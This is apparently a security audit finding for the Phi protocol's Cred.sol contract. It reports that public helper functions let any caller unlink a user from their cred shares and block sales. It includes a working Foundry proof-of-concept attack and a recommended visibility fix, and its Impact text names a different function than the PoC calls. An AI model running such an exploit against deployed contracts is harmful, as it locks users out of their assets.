# Vulnerability details

## Impact

An attacker can prevent users from selling their cred shares due to wrong function visibility. By calling the public function [`Cred.sol::_addCredIdPerAddress()`](https://github.com/code-423n4/2024-08-phi/blob/main/src/Cred.sol#L685), the attacker can disassociate the user from their shares, effectively locking the user's ability to sell them. This results in a denial of service scenario, where users are unable to sell their shares.

## Proof of Concept

Here is a Proof of Concept demonstrating how an attacker can exploit this vulnerability:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import { Settings, console2 as console } from "../helpers/Settings.sol";

import { ECDSA } from "solady/utils/ECDSA.sol";

contract DenialOfServiceGrief is Settings {
    address internal immutable attacker = makeAddr("attacker");
    address internal immutable creator = makeAddr("creator");
    address internal immutable user = makeAddr("user");

    function setUp() public override {
        super.setUp();
    }

    function test_denial_of_service_grief() public {
        // Create a new cred.
        uint256 credId = _createCred();

        // Get the amount of ETH needed to buy one share.
        uint256 price = bondingCurve.getBuyPriceAfterFee(credId, 1, 1);

        // Deal ETH to the user
        deal(user, price);

        // User buys one share of the cred.
        vm.prank(user);
        cred.buyShareCred{ value: price }(credId, 1, price);

        // Attacker removes the association between the user and the cred id.
        vm.prank(attacker);
        cred._removeCredIdPerAddress(credId, user);

        // Wait for the share lock period to end.
        skip(cred.SHARE_LOCK_PERIOD() + 1);

        // User tries to sell his share but the function reverts
        vm.startPrank(user);
        vm.expectRevert();
        cred.sellShareCred(credId, 1, 0);
    }

    function _createCred() internal returns (uint256){
        // Encode the create cred data.
        bytes memory data = abi.encode(block.timestamp + 100, creator, 31_337, address(bondingCurve), "test", "BASIC", "SIGNATURE", 0x0);

        // Compute the hash of the structured data.
        bytes32 structHash = keccak256(data);

        // Compute the digest of the structured data.
        bytes32 digest = ECDSA.toEthSignedMessageHash(structHash);

        // Phi signer signates the create cred digest.
        (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, digest);
        if (cv != 27) cs = cs | bytes32(uint256(1) << 255);

        // Creator submites the create cred transaction signed by the phi signer.
        vm.startPrank(creator);

        // Get the price needed to buy the first share.
        uint256 credId = 1;
        uint256 supply = 0;
        uint256 amountToBuy = 1;
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(credId, supply, amountToBuy);

        // Deal ETH to the creator to buy the first share.
        deal(creator, buyPrice);

        // Create new cred.
        cred.createCred{ value: buyPrice }(creator, data, abi.encodePacked(cr, cs), 100, 100);

        vm.stopPrank();

        // Return the cred id of the newly created cred.
        return credId;
    }
}
```

## Tools Used

Manual Review, Foundry

## Recommended Mitigation Steps

Consider updating the visibility of [`Cred.sol::_addCredIdPerAddress()`](https://github.com/code-423n4/2024-08-phi/blob/main/src/Cred.sol#L685) and [`Cred.sol::_removeCredIdPerAddress()`](https://github.com/code-423n4/2024-08-phi/blob/main/src/Cred.sol#L695) from `public` to `internal`.
